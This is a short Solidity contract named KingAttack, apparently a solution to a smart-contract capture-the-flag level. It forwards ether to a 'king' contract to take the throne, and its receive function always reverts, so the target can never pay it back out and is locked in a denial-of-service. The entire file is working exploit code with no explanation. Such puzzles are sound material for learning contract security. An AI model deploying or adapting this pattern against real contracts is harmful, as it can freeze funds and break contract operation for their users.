// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract KingAttack {
    function becomeKing(address _old_king) public payable {
        (bool success, ) = payable(_old_king).call{value: msg.value}("");
        require(success);
    }
    
    receive() external payable {
        revert();
    }
}